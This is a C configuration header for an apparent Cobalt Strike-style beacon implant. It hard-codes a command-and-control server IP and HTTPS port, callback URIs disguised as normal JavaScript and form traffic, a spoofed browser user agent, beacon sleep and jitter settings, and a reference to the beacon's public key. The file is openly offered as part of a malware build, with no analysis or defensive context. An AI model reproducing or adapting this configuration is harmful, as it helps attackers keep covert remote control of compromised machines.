#ifndef CONFIG_H
#define CONFIG_H

// Cobalt Strike Team Server Configuration
#define C2_SERVER "100.77.61.92"
#define C2_PORT 443
#define C2_USE_HTTPS 1

// HTTP URIs
#define HTTP_GET_URI "/en_US/all.js"
#define HTTP_POST_URI "/submit.php"

// User Agent
#define USER_AGENT "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"

// Common HTTP headers
#define HTTP_ACCEPT_HEADER        "Accept: */*"
#define HTTP_CONNECTION_HEADER    "Connection: Keep-Alive"
#define HTTP_CACHE_CONTROL_HEADER "Cache-Control: no-cache"

// Beacon Configuration
#define SLEEP_TIME 60000      // 60 seconds in milliseconds
#define JITTER 0              // 0% jitter
#define MAX_GET_SIZE 1048576  // 1MB

// Declared as extern - defined in beacon.c
extern unsigned char BEACON_PUBLIC_KEY[256];
extern unsigned int BEACON_PUBLIC_KEY_LEN;

#endif // CONFIG_H
